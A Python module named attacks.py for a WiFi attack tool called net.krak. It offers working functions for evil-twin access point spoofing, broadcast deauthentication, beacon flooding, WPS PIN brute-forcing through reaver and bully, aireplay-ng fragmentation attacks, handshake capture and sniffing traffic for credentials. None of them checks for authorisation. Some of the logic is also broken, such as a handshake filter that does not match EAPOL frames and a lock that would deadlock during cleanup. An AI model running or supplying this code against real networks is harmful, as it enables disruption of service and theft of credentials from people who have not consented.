"""
attacks.py - Hardened WiFi attack logic for net.krak
Enhanced with better error handling, validation, and security measures
"""
import logging
import subprocess
import shutil
import time
import threading
import signal
import os
try:
    import psutil
except ImportError:
    psutil = None
from pathlib import Path
from scapy.layers.dot11 import Dot11, Dot11Deauth, RadioTap, Dot11Beacon, Dot11Elt
from scapy.sendrecv import sendp
from scapy.all import sniff, get_if_list
import json

class AttackManager:
    """Centralized attack management with process tracking and cleanup"""
    
    def __init__(self, logger=None):
        self.logger = logger or logging.getLogger("attacks")
        self.active_processes = {}
        self.attack_status = {}
        self.lock = threading.Lock()
        
    def _validate_interface(self, interface):
        """Validate that the interface exists and is in monitor mode"""
        try:
            if interface not in get_if_list():
                raise ValueError(f"Interface {interface} not found")
            
            # Try to check if interface is in monitor mode (optional for testing)
            try:
                result = subprocess.run(
                    ["iwconfig", interface], 
                    capture_output=True, 
                    text=True, 
                    timeout=5
                )
                if "Mode:Monitor" not in result.stdout:
                    self.logger.warning(f"Interface {interface} may not be in monitor mode")
            except FileNotFoundError:
                # iwconfig not available, skip monitor mode check
                self.logger.warning("iwconfig not available, skipping monitor mode check")
            except subprocess.TimeoutExpired:
                self.logger.warning(f"Timeout checking interface {interface}")
            
            return True
        except Exception as e:
            raise ValueError(f"Interface validation failed: {e}")
    
    def _validate_mac_address(self, mac):
        """Validate MAC address format"""
        import re
        mac_pattern = r'^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$'
        if not re.match(mac_pattern, mac):
            raise ValueError(f"Invalid MAC address format: {mac}")
        return True
    
    def _validate_channel(self, channel):
        """Validate WiFi channel number"""
        if not isinstance(channel, int) or not (1 <= channel <= 165):
            raise ValueError(f"Invalid channel number: {channel}. Must be 1-165")
        return True
    
    def _log_attack_event(self, event_type, **kwargs):
        """Log attack events with structured data"""
        event_data = {
            "timestamp": time.time(),
            "event_type": event_type,
            "pid": os.getpid(),
            **kwargs
        }
        self.logger.info(json.dumps(event_data))
    
    def _cleanup_process(self, process_id):
        """Safely cleanup a process"""
        with self.lock:
            if process_id in self.active_processes:
                process = self.active_processes[process_id]
                try:
                    if process.poll() is None:  # Process is still running
                        process.terminate()
                        time.sleep(1)
                        if process.poll() is None:  # Still running
                            process.kill()
                    self.active_processes.pop(process_id, None)
                    self.attack_status.pop(process_id, None)
                    self._log_attack_event("process_cleaned", process_id=process_id)
                except Exception as e:
                    self.logger.error(f"Error cleaning up process {process_id}: {e}")
    
    def cleanup_all_processes(self):
        """Cleanup all active processes"""
        with self.lock:
            for process_id in list(self.active_processes.keys()):
                self._cleanup_process(process_id)
    
    def get_attack_status(self):
        """Get status of all active attacks"""
        with self.lock:
            return dict(self.attack_status)

# Global attack manager instance
attack_manager = AttackManager()

def evil_twin_attack(interface, target_bssid, target_ssid, channel=6, logger=None):
    """
    REAL Evil Twin attack using Scapy to create fake access point
    
    Args:
        interface: Network interface in monitor mode
        target_bssid: BSSID of target AP to spoof
        target_ssid: SSID of target AP to spoof
        channel: WiFi channel to use
        logger: Logger instance
    """
    if logger is None:
        logger = logging.getLogger("attacks")
    
    try:
        # Validate inputs
        attack_manager._validate_interface(interface)
        attack_manager._validate_mac_address(target_bssid)
        
        logger.info(f"Starting REAL evil twin attack: {target_ssid} ({target_bssid}) on channel {channel}")
        attack_manager._log_attack_event("evil_twin_start", 
                                       interface=interface, 
                                       target_bssid=target_bssid, 
                                       target_ssid=target_ssid,
                                       channel=channel)
        
        # Create beacon frames for evil twin
        radiotap = RadioTap()
        
        # Use target BSSID for spoofing
        dot11 = Dot11(
            type=0,  # Management frame
            subtype=8,  # Beacon
            addr1="ff:ff:ff:ff:ff:ff",  # Destination (broadcast)
            addr2=target_bssid,  # Source (spoofed AP)
            addr3=target_bssid   # BSSID (spoofed)
        )
        
        beacon = Dot11Beacon(
            cap=0x1104,  # ESS, privacy
            timestamp=int(time.time() * 1000000) % (2**64)
        )
        
        # SSID element
        ssid_elt = Dot11Elt(ID=0, info=target_ssid.encode())
        
        # Supported rates element
        rates_elt = Dot11Elt(ID=1, info=b'\x82\x84\x8b\x96\x0c\x12\x18\x24')
        
        # DS Parameter Set (channel)
        ds_elt = Dot11Elt(ID=3, info=bytes([channel]))
        
        # Assemble packet
        packet = radiotap / dot11 / beacon / ssid_elt / rates_elt / ds_elt
        
        # Send beacon frames continuously
        start_time = time.time()
        sent_count = 0
        
        logger.info(f"Broadcasting evil twin beacons for {target_ssid}...")
        
        while True:  # Run until stopped
            try:
                sendp(packet, iface=interface, verbose=False)
                sent_count += 1
                
                if sent_count % 100 == 0:
                    logger.info(f"Sent {sent_count} evil twin beacons")
                
                time.sleep(0.1)  # 10 beacons per second
                
            except KeyboardInterrupt:
                break
            except Exception as e:
                logger.warning(f"Failed to send beacon: {e}")
                continue
        
        duration = time.time() - start_time
        logger.info(f"Evil twin attack completed: {sent_count} beacons sent in {duration:.2f}s")
        attack_manager._log_attack_event("evil_twin_complete", 
                                       interface=interface, 
                                       target_bssid=target_bssid,
                                       sent_count=sent_count,
                                       duration=duration)
        return True
        
    except Exception as e:
        logger.error(f"Evil twin attack failed: {e}")
        attack_manager._log_attack_event("evil_twin_error", 
                                       interface=interface, 
                                       target_bssid=target_bssid, 
                                       error=str(e))
        return False

def wps_attack(interface, target_bssid, timeout=300, logger=None):
    """
    REAL WPS PIN attack using external tools
    
    Args:
        interface: Network interface in monitor mode
        target_bssid: BSSID of target AP
        timeout: Attack timeout in seconds
        logger: Logger instance
    """
    if logger is None:
        logger = logging.getLogger("attacks")
    
    try:
        # Validate inputs
        attack_manager._validate_interface(interface)
        attack_manager._validate_mac_address(target_bssid)
        
        logger.info(f"Starting REAL WPS attack on {target_bssid}")
        attack_manager._log_attack_event("wps_attack_start", 
                                       interface=interface, 
                                       target_bssid=target_bssid)
        
        # Try reaver first, then bully
        tools = ['reaver', 'bully']
        success = False
        
        for tool in tools:
            try:
                if tool == 'reaver':
                    cmd = ['reaver', '-i', interface, '-b', target_bssid, '-vv', '-L', '-N', '-d', '15', '-T', '0.5', '-r', '3:15']
                else:  # bully
                    cmd = ['bully', interface, '-b', target_bssid, '-v', '3', '-S', '-F', '-B']
                
                logger.info(f"Running {tool} WPS attack...")
                result = run_external_tool(cmd, dry_run=False, logger=logger, timeout=timeout)
                
                if result:
                    success = True
                    break
                    
            except Exception as e:
                logger.warning(f"{tool} WPS attack failed: {e}")
                continue
        
        if success:
            logger.info(f"WPS attack completed successfully on {target_bssid}")
            attack_manager._log_attack_event("wps_attack_complete", 
                                           interface=interface, 
                                           target_bssid=target_bssid)
        else:
            logger.warning(f"WPS attack failed on {target_bssid}")
            attack_manager._log_attack_event("wps_attack_failed", 
                                           interface=interface, 
                                           target_bssid=target_bssid)
        
        return success
        
    except Exception as e:
        logger.error(f"WPS attack failed: {e}")
        attack_manager._log_attack_event("wps_attack_error", 
                                       interface=interface, 
                                       target_bssid=target_bssid,
                                       error=str(e))
        return False

def credential_capture(interface, target_bssid, duration=300, logger=None):
    """
    REAL credential capture using packet sniffing
    
    Args:
        interface: Network interface in monitor mode
        target_bssid: BSSID of target AP
        duration: Capture duration in seconds
        logger: Logger instance
    """
    if logger is None:
        logger = logging.getLogger("attacks")
    
    try:
        # Validate inputs
        attack_manager._validate_interface(interface)
        attack_manager._validate_mac_address(target_bssid)
        
        logger.info(f"Starting REAL credential capture on {target_bssid}")
        attack_manager._log_attack_event("credential_capture_start", 
                                       interface=interface, 
                                       target_bssid=target_bssid)
        
        # Set up packet filter for HTTP/HTTPS traffic
        def credential_filter(packet):
            if packet.haslayer(Dot11):
                # Look for data frames to/from target
                if (packet[Dot11].addr1 == target_bssid or 
                    packet[Dot11].addr2 == target_bssid):
                    return True
            return False
        
        # Capture packets
        start_time = time.time()
        captured_packets = []
        credentials_found = []
        
        def packet_handler(packet):
            if credential_filter(packet):
                captured_packets.append(packet)
                
                # Look for HTTP data
                if packet.haslayer('Raw'):
                    try:
                        data = packet['Raw'].load.decode('utf-8', errors='ignore')
                        
                        # Look for common credential patterns
                        if any(keyword in data.lower() for keyword in ['password', 'username', 'login', 'auth', 'credential']):
                            credentials_found.append({
                                'timestamp': time.time(),
                                'data': data[:200],  # First 200 chars
                                'source': packet[Dot11].addr2 if packet[Dot11].addr2 != target_bssid else packet[Dot11].addr1
                            })
                            logger.info(f"Potential credentials found from {credentials_found[-1]['source']}")
                    except:
                        pass
        
        # Start sniffing
        sniff(iface=interface, prn=packet_handler, timeout=duration, store=0)
        
        # Save captured data
        if captured_packets:
            from scapy.utils import wrpcap
            output_file = f"/tmp/credentials_{target_bssid.replace(':', '')}.pcap"
            wrpcap(output_file, captured_packets)
            logger.info(f"Credential capture completed: {len(captured_packets)} packets, {len(credentials_found)} potential credentials saved to {output_file}")
        else:
            logger.warning("No packets captured")
        
        attack_manager._log_attack_event("credential_capture_complete", 
                                       interface=interface, 
                                       target_bssid=target_bssid,
                                       packet_count=len(captured_packets),
                                       credential_count=len(credentials_found))
        
        return len(credentials_found) > 0
        
    except Exception as e:
        logger.error(f"Credential capture failed: {e}")
        attack_manager._log_attack_event("credential_capture_error", 
                                       interface=interface, 
                                       target_bssid=target_bssid,
                                       error=str(e))
        return False

def fragmentation_attack(interface, target_bssid, timeout=300, logger=None):
    """
    REAL fragmentation attack using aireplay-ng
    
    Args:
        interface: Network interface in monitor mode
        target_bssid: BSSID of target AP
        timeout: Attack timeout in seconds
        logger: Logger instance
    """
    if logger is None:
        logger = logging.getLogger("attacks")
    
    try:
        # Validate inputs
        attack_manager._validate_interface(interface)
        attack_manager._validate_mac_address(target_bssid)
        
        logger.info(f"Starting REAL fragmentation attack on {target_bssid}")
        attack_manager._log_attack_event("fragmentation_attack_start", 
                                       interface=interface, 
                                       target_bssid=target_bssid)
        
        # Use aireplay-ng for fragmentation attack
        cmd = ['aireplay-ng', '-5', '-b', target_bssid, interface]
        
        result = run_external_tool(cmd, dry_run=False, logger=logger, timeout=timeout)
        
        if result:
            logger.info(f"Fragmentation attack completed successfully on {target_bssid}")
            attack_manager._log_attack_event("fragmentation_attack_complete", 
                                           interface=interface, 
                                           target_bssid=target_bssid)
        else:
            logger.warning(f"Fragmentation attack failed on {target_bssid}")
            attack_manager._log_attack_event("fragmentation_attack_failed", 
                                           interface=interface, 
                                           target_bssid=target_bssid)
        
        return result
        
    except Exception as e:
        logger.error(f"Fragmentation attack failed: {e}")
        attack_manager._log_attack_event("fragmentation_attack_error", 
                                       interface=interface, 
                                       target_bssid=target_bssid,
                                       error=str(e))
        return False

def deauth_attack(interface, target_bssid, packet_count=10, dry_run=False, logger=None, 
                 target_client='ff:ff:ff:ff:ff:ff', interval=0.1):
    """
    REAL deauthentication attack implementation using Scapy
    
    Args:
        interface: Network interface in monitor mode
        target_bssid: BSSID of target access point
        packet_count: Number of deauth packets to send
        dry_run: If True, only simulate the attack
        logger: Logger instance
        target_client: Target client MAC (default: broadcast)
        interval: Interval between packets in seconds
    """
    if logger is None:
        logger = logging.getLogger("attacks")
    
    try:
        # Validate inputs
        attack_manager._validate_interface(interface)
        attack_manager._validate_mac_address(target_bssid)
        attack_manager._validate_mac_address(target_client)
        
        if not isinstance(packet_count, int) or packet_count <= 0:
            raise ValueError("Packet count must be a positive integer")
        
        if dry_run:
            logger.info(f"[DRY RUN] Would send {packet_count} deauth packets to {target_bssid} on {interface}")
            attack_manager._log_attack_event("deauth_dry_run", 
                                           interface=interface, 
                                           target_bssid=target_bssid,
                                           packet_count=packet_count)
            return True
        
        # REAL deauth packet creation and transmission
        logger.info(f"Executing REAL deauth attack: {packet_count} packets to {target_bssid}")
        attack_manager._log_attack_event("deauth_start", 
                                       interface=interface, 
                                       target_bssid=target_bssid,
                                       packet_count=packet_count)
        
        # Create RadioTap header for proper transmission
        radiotap = RadioTap()
        
        # Create Dot11 header with proper addressing
        dot11 = Dot11(
            type=0,  # Management frame
            subtype=12,  # Deauthentication
            addr1=target_client,  # Destination (client)
            addr2=target_bssid,   # Source (AP)
            addr3=target_bssid    # BSSID
        )
        
        # Create deauthentication frame
        deauth = Dot11Deauth(reason=7)  # Class 3 frame received from nonassociated station
        
        # Assemble packet
        packet = radiotap / dot11 / deauth
        
        # Send packets with real transmission
        start_time = time.time()
        sent_count = 0
        
        for i in range(packet_count):
            try:
                sendp(packet, iface=interface, verbose=False)
                sent_count += 1
                if i % 10 == 0:  # Progress update every 10 packets
                    logger.info(f"Sent {sent_count}/{packet_count} deauth packets")
                time.sleep(interval)
            except Exception as e:
                logger.warning(f"Failed to send packet {i+1}: {e}")
                continue
        
        duration = time.time() - start_time
        success_rate = (sent_count / packet_count) * 100
        
        logger.info(f"Deauth attack completed: {sent_count}/{packet_count} packets sent in {duration:.2f}s (Success: {success_rate:.1f}%)")
        attack_manager._log_attack_event("deauth_complete", 
                                       interface=interface, 
                                       target_bssid=target_bssid,
                                       sent_count=sent_count,
                                       total_count=packet_count,
                                       success_rate=success_rate,
                                       duration=duration)
        return True
        
    except Exception as e:
        logger.error(f"Deauth attack failed: {e}")
        attack_manager._log_attack_event("deauth_error", 
                                       interface=interface, 
                                       target_bssid=target_bssid,
                                       error=str(e))
        return False

def handshake_capture(interface, target_bssid, output_file, duration=60, logger=None):
    """
    REAL WPA handshake capture using Scapy
    
    Args:
        interface: Network interface in monitor mode
        target_bssid: BSSID of target access point
        output_file: File to save captured handshake
        duration: Capture duration in seconds
        logger: Logger instance
    """
    if logger is None:
        logger = logging.getLogger("attacks")
    
    try:
        # Validate inputs
        attack_manager._validate_interface(interface)
        attack_manager._validate_mac_address(target_bssid)
        
        logger.info(f"Starting REAL handshake capture for {target_bssid} on {interface}")
        attack_manager._log_attack_event("handshake_start", 
                                       interface=interface, 
                                       target_bssid=target_bssid,
                                       duration=duration)
        
        # Set up packet filter for handshake frames
        def handshake_filter(packet):
            if packet.haslayer(Dot11):
                # Look for EAPOL frames (handshake)
                if packet.haslayer(Dot11Elt) and packet[Dot11].addr2 == target_bssid:
                    return True
            return False
        
        # Capture packets
        start_time = time.time()
        captured_packets = []
        
        def packet_handler(packet):
            if handshake_filter(packet):
                captured_packets.append(packet)
                logger.info(f"Captured handshake packet #{len(captured_packets)}")
        
        # Start sniffing
        sniff(iface=interface, prn=packet_handler, timeout=duration, store=0)
        
        # Save captured packets
        if captured_packets:
            from scapy.utils import wrpcap
            wrpcap(output_file, captured_packets)
            logger.info(f"Handshake capture completed: {len(captured_packets)} packets saved to {output_file}")
            attack_manager._log_attack_event("handshake_complete", 
                                           interface=interface, 
                                           target_bssid=target_bssid,
                                           packet_count=len(captured_packets),
                                           output_file=output_file)
            return True
        else:
            logger.warning("No handshake packets captured")
            attack_manager._log_attack_event("handshake_failed", 
                                           interface=interface, 
                                           target_bssid=target_bssid,
                                           reason="no_packets_captured")
            return False
            
    except Exception as e:
        logger.error(f"Handshake capture failed: {e}")
        attack_manager._log_attack_event("handshake_error", 
                                       interface=interface, 
                                       target_bssid=target_bssid,
                                       error=str(e))
        return False

def beacon_flood(interface, ssid, packet_count=100, interval=0.1, logger=None):
    """
    REAL beacon flood attack using Scapy
    
    Args:
        interface: Network interface in monitor mode
        ssid: SSID to flood
        packet_count: Number of beacon packets to send
        interval: Interval between packets
        logger: Logger instance
    """
    if logger is None:
        logger = logging.getLogger("attacks")
    
    try:
        # Validate inputs
        attack_manager._validate_interface(interface)
        
        logger.info(f"Starting REAL beacon flood attack: {packet_count} packets for SSID '{ssid}'")
        attack_manager._log_attack_event("beacon_flood_start", 
                                       interface=interface, 
                                       ssid=ssid,
                                       packet_count=packet_count)
        
        # Create beacon packet
        radiotap = RadioTap()
        
        # Random MAC for fake AP
        import random
        fake_mac = ':'.join(['%02x' % random.randint(0, 255) for _ in range(6)])
        
        dot11 = Dot11(
            type=0,  # Management frame
            subtype=8,  # Beacon
            addr1="ff:ff:ff:ff:ff:ff",  # Destination (broadcast)
            addr2=fake_mac,  # Source (fake AP)
            addr3=fake_mac   # BSSID
        )
        
        beacon = Dot11Beacon(
            cap=0x1104,  # ESS, privacy
            timestamp=int(time.time() * 1000000) % (2**64)
        )
        
        # SSID element
        ssid_elt = Dot11Elt(ID=0, info=ssid.encode())
        
        # Assemble packet
        packet = radiotap / dot11 / beacon / ssid_elt
        
        # Send packets
        start_time = time.time()
        sent_count = 0
        
        for i in range(packet_count):
            try:
                sendp(packet, iface=interface, verbose=False)
                sent_count += 1
                if i % 20 == 0:  # Progress update every 20 packets
                    logger.info(f"Sent {sent_count}/{packet_count} beacon packets")
                time.sleep(interval)
            except Exception as e:
                logger.warning(f"Failed to send beacon packet {i+1}: {e}")
                continue
        
        duration = time.time() - start_time
        success_rate = (sent_count / packet_count) * 100
        
        logger.info(f"Beacon flood completed: {sent_count}/{packet_count} packets sent in {duration:.2f}s (Success: {success_rate:.1f}%)")
        attack_manager._log_attack_event("beacon_flood_complete", 
                                       interface=interface, 
                                       ssid=ssid,
                                       sent_count=sent_count,
                                       total_count=packet_count,
                                       success_rate=success_rate,
                                       duration=duration)
        return True
        
    except Exception as e:
        logger.error(f"Beacon flood failed: {e}")
        attack_manager._log_attack_event("beacon_flood_error", 
                                       interface=interface, 
                                       ssid=ssid,
                                       error=str(e))
        return False

def run_external_tool(cmd_args, dry_run=False, logger=None, timeout=300, capture_output=True):
    """
    Enhanced external tool execution with better process management
    
    Args:
        cmd_args: Command and arguments list
        dry_run: If True, only simulate execution
        logger: Logger instance
        timeout: Process timeout in seconds
        capture_output: Whether to capture stdout/stderr
    """
    if logger is None:
        logger = logging.getLogger("attacks")
    
    try:
        # Validate command
        if not cmd_args or not isinstance(cmd_args, list):
            raise ValueError("Command arguments must be a non-empty list")
        
        tool_name = cmd_args[0]
        if shutil.which(tool_name) is None:
            # Enhanced error message with diagnostics
            error_msg = f"Required tool '{tool_name}' not found in PATH"
            error_msg += f"\nRun diagnostics: python3 -m utils.runtime_diagnostics"
            
            # Provide specific installation instructions based on tool
            tool_install_map = {
                'airodump-ng': 'sudo apt-get install aircrack-ng',
                'aireplay-ng': 'sudo apt-get install aircrack-ng',
                'aircrack-ng': 'sudo apt-get install aircrack-ng',
                'airmon-ng': 'sudo apt-get install aircrack-ng',
                'reaver': 'sudo apt-get install reaver',
                'bully': 'sudo apt-get install bully',
                'iw': 'sudo apt-get install wireless-tools',
                'iwconfig': 'sudo apt-get install wireless-tools',
                'ifconfig': 'sudo apt-get install net-tools'
            }
            
            if tool_name in tool_install_map:
                error_msg += f"\nInstall with: {tool_install_map[tool_name]}"
            
            raise FileNotFoundError(error_msg)
        
        if dry_run:
            logger.info(f"[DRY RUN] Would run: {' '.join(cmd_args)}")
            attack_manager._log_attack_event("external_tool_dry_run", command=cmd_args)
            return "DRY_RUN_PROCESS"
        
        # Start process with proper error handling
        process = subprocess.Popen(
            cmd_args, 
            stdout=subprocess.PIPE if capture_output else None,
            stderr=subprocess.PIPE if capture_output else None, 
            text=True,
            preexec_fn=os.setsid  # Create new process group
        )
        
        process_id = str(process.pid)
        with attack_manager.lock:
            attack_manager.active_processes[process_id] = process
            attack_manager.attack_status[process_id] = {
                "command": cmd_args,
                "start_time": time.time(),
                "status": "running"
            }
        
        logger.info(f"Started process: {' '.join(cmd_args)} (PID {process.pid})")
        attack_manager._log_attack_event("external_tool_start", 
                                       command=cmd_args, 
                                       process_id=process_id)
        
        return process
        
    except FileNotFoundError as e:
        logger.error(f"Command '{cmd_args[0]}' not found: {e}")
        attack_manager._log_attack_event("external_tool_error", 
                                       command=cmd_args, 
                                       error=str(e))
        return None
    except Exception as e:
        logger.error(f"Failed to start process {' '.join(cmd_args)}: {e}")
        attack_manager._log_attack_event("external_tool_error", 
                                       command=cmd_args, 
                                       error=str(e))
        return None

def capture_handshake(interface, bssid, channel=None, output_prefix="handshake", 
                     dry_run=False, logger=None, duration=300):
    """
    Enhanced handshake capture with better process management
    
    Args:
        interface: Network interface in monitor mode
        bssid: Target BSSID
        channel: WiFi channel (optional)
        output_prefix: Output file prefix
        dry_run: If True, only simulate capture
        logger: Logger instance
        duration: Capture duration in seconds
    """
    if logger is None:
        logger = logging.getLogger("attacks")
    
    try:
        # Validate inputs
        attack_manager._validate_interface(interface)
        attack_manager._validate_mac_address(bssid)
        
        if channel is not None:
            attack_manager._validate_channel(channel)
        
        # Build command
        cmd = ["airodump-ng", "--bssid", bssid, "-w", output_prefix, interface]
        if channel:
            cmd.extend(["-c", str(channel)])
        
        logger.info(f"Starting handshake capture on {bssid} (channel: {channel or 'auto'})")
        attack_manager._log_attack_event("handshake_capture_start", 
                                       interface=interface, 
                                       bssid=bssid, 
                                       channel=channel)
        
        process = run_external_tool(cmd, dry_run=dry_run, logger=logger)
        
        if process and not dry_run:
            # Set up timeout
            def timeout_handler():
                time.sleep(duration)
                if process.poll() is None:
                    process.terminate()
                    logger.info(f"Handshake capture timed out after {duration}s")
            
            timeout_thread = threading.Thread(target=timeout_handler)
            timeout_thread.daemon = True
            timeout_thread.start()
        
        return process
        
    except Exception as e:
        logger.error(f"Handshake capture failed: {e}")
        attack_manager._log_attack_event("handshake_capture_error", 
                                       interface=interface, 
                                       bssid=bssid, 
                                       error=str(e))
        return None

def perform_evil_twin(interface, bssid, ssid, dry_run=False, logger=None, 
                     channel=None, hidden=False):
    """
    Enhanced evil twin attack with better configuration options
    
    Args:
        interface: Network interface in monitor mode
        bssid: Target BSSID to spoof
        ssid: SSID to broadcast
        dry_run: If True, only simulate attack
        logger: Logger instance
        channel: WiFi channel (optional)
        hidden: Whether to create hidden network
    """
    if logger is None:
        logger = logging.getLogger("attacks")
    
    try:
        # Validate inputs
        attack_manager._validate_interface(interface)
        attack_manager._validate_mac_address(bssid)
        
        if not ssid or not isinstance(ssid, str):
            raise ValueError("SSID must be a non-empty string")
        
        if channel is not None:
            attack_manager._validate_channel(channel)
        
        # Build command
        cmd = ["airbase-ng", "-a", bssid, "-e", ssid, "--essid", ssid, interface]
        if channel:
            cmd.extend(["-c", str(channel)])
        if hidden:
            cmd.append("--hidden")
        
        logger.info(f"Starting evil twin attack: {ssid} ({bssid})")
        attack_manager._log_attack_event("evil_twin_start", 
                                       interface=interface, 
                                       bssid=bssid, 
                                       ssid=ssid,
                                       channel=channel)
        
        process = run_external_tool(cmd, dry_run=dry_run, logger=logger)
        return process
        
    except Exception as e:
        logger.error(f"Evil twin attack failed: {e}")
        attack_manager._log_attack_event("evil_twin_error", 
                                       interface=interface, 
                                       bssid=bssid, 
                                       ssid=ssid,
                                       error=str(e))
        return None

def capture_credentials(interface, bssid, channel=None, output_prefix="captured_creds", 
                      dry_run=False, logger=None, duration=600):
    """
    Enhanced credential capture with better monitoring
    
    Args:
        interface: Network interface in monitor mode
        bssid: Target BSSID
        channel: WiFi channel (optional)
        output_prefix: Output file prefix
        dry_run: If True, only simulate capture
        logger: Logger instance
        duration: Capture duration in seconds
    """
    if logger is None:
        logger = logging.getLogger("attacks")
    
    try:
        # Validate inputs
        attack_manager._validate_interface(interface)
        attack_manager._validate_mac_address(bssid)
        
        if channel is not None:
            attack_manager._validate_channel(channel)
        
        # Build command
        cmd = ["airodump-ng", "--bssid", bssid, "-w", output_prefix, interface]
        if channel:
            cmd.extend(["-c", str(channel)])
        
        logger.info(f"Starting credential capture on {bssid} (channel: {channel or 'auto'})")
        attack_manager._log_attack_event("credential_capture_start", 
                                       interface=interface, 
                                       bssid=bssid, 
                                       channel=channel)
        
        process = run_external_tool(cmd, dry_run=dry_run, logger=logger)
        
        if process and not dry_run:
            # Set up timeout
            def timeout_handler():
                time.sleep(duration)
                if process.poll() is None:
                    process.terminate()
                    logger.info(f"Credential capture timed out after {duration}s")
            
            timeout_thread = threading.Thread(target=timeout_handler)
            timeout_thread.daemon = True
            timeout_thread.start()
        
        return process
        
    except Exception as e:
        logger.error(f"Credential capture failed: {e}")
        attack_manager._log_attack_event("credential_capture_error", 
                                       interface=interface, 
                                       bssid=bssid, 
                                       error=str(e))
        return None

def perform_wps_attack(interface, bssid, dry_run=False, logger=None, timeout=300):
    """
    Perform WPS PIN attack using reaver or bully
    
    Args:
        interface: Network interface in monitor mode
        bssid: Target BSSID
        dry_run: If True, only simulate attack
        logger: Logger instance
        timeout: Attack timeout in seconds
    """
    if logger is None:
        logger = logging.getLogger("attacks")
    
    try:
        # Validate inputs
        attack_manager._validate_interface(interface)
        attack_manager._validate_mac_address(bssid)
        
        # Try reaver first, then bully
        tools = ["reaver", "bully"]
        cmd = None
        
        for tool in tools:
            if shutil.which(tool):
                if tool == "reaver":
                    cmd = ["reaver", "-i", interface, "-b", bssid, "-vv", "-L", "-N", "-d", "15", "-T", "0.5", "-r", "3:15"]
                elif tool == "bully":
                    cmd = ["bully", interface, "-b", bssid, "-v", "3"]
                break
        
        if not cmd:
            raise FileNotFoundError("Neither reaver nor bully found in PATH")
        
        logger.info(f"Starting WPS attack on {bssid} using {cmd[0]}")
        attack_manager._log_attack_event("wps_attack_start", 
                                       interface=interface, 
                                       bssid=bssid,
                                       tool=cmd[0])
        
        process = run_external_tool(cmd, dry_run=dry_run, logger=logger)
        
        if process and not dry_run:
            # Set up timeout
            def timeout_handler():
                time.sleep(timeout)
                if process.poll() is None:
                    process.terminate()
                    logger.info(f"WPS attack timed out after {timeout}s")
            
            timeout_thread = threading.Thread(target=timeout_handler)
            timeout_thread.daemon = True
            timeout_thread.start()
        
        return process
        
    except Exception as e:
        logger.error(f"WPS attack failed: {e}")
        attack_manager._log_attack_event("wps_attack_error", 
                                       interface=interface, 
                                       bssid=bssid, 
                                       error=str(e))
        return None

def perform_fragmentation_attack(interface, bssid, dry_run=False, logger=None, timeout=300):
    """
    Perform fragmentation attack using aireplay-ng
    
    Args:
        interface: Network interface in monitor mode
        bssid: Target BSSID
        dry_run: If True, only simulate attack
        logger: Logger instance
        timeout: Attack timeout in seconds
    """
    if logger is None:
        logger = logging.getLogger("attacks")
    
    try:
        # Validate inputs
        attack_manager._validate_interface(interface)
        attack_manager._validate_mac_address(bssid)
        
        cmd = ["aireplay-ng", "-5", "-b", bssid, interface]
        
        logger.info(f"Starting fragmentation attack on {bssid}")
        attack_manager._log_attack_event("fragmentation_attack_start", 
                                       interface=interface, 
                                       bssid=bssid)
        
        process = run_external_tool(cmd, dry_run=dry_run, logger=logger)
        
        if process and not dry_run:
            # Set up timeout
            def timeout_handler():
                time.sleep(timeout)
                if process.poll() is None:
                    process.terminate()
                    logger.info(f"Fragmentation attack timed out after {timeout}s")
            
            timeout_thread = threading.Thread(target=timeout_handler)
            timeout_thread.daemon = True
            timeout_thread.start()
        
        return process
        
    except Exception as e:
        logger.error(f"Fragmentation attack failed: {e}")
        attack_manager._log_attack_event("fragmentation_attack_error", 
                                       interface=interface, 
                                       bssid=bssid, 
                                       error=str(e))
        return None

def stop_attack(process_id, logger=None):
    """
    Stop a specific attack process
    
    Args:
        process_id: Process ID to stop
        logger: Logger instance
    """
    if logger is None:
        logger = logging.getLogger("attacks")
    
    try:
        attack_manager._cleanup_process(process_id)
        logger.info(f"Stopped attack process {process_id}")
        attack_manager._log_attack_event("attack_stopped", process_id=process_id)
        return True
    except Exception as e:
        logger.error(f"Failed to stop attack process {process_id}: {e}")
        return False

def stop_all_attacks(logger=None):
    """
    Stop all active attack processes
    
    Args:
        logger: Logger instance
    """
    if logger is None:
        logger = logging.getLogger("attacks")
    
    try:
        attack_manager.cleanup_all_processes()
        logger.info("Stopped all attack processes")
        attack_manager._log_attack_event("all_attacks_stopped")
        return True
    except Exception as e:
        logger.error(f"Failed to stop all attacks: {e}")
        return False

def get_attack_status():
    """
    Get status of all active attacks
    
    Returns:
        dict: Status of all active attacks
    """
    return attack_manager.get_attack_status()

# Cleanup on module exit
import atexit
atexit.register(attack_manager.cleanup_all_processes)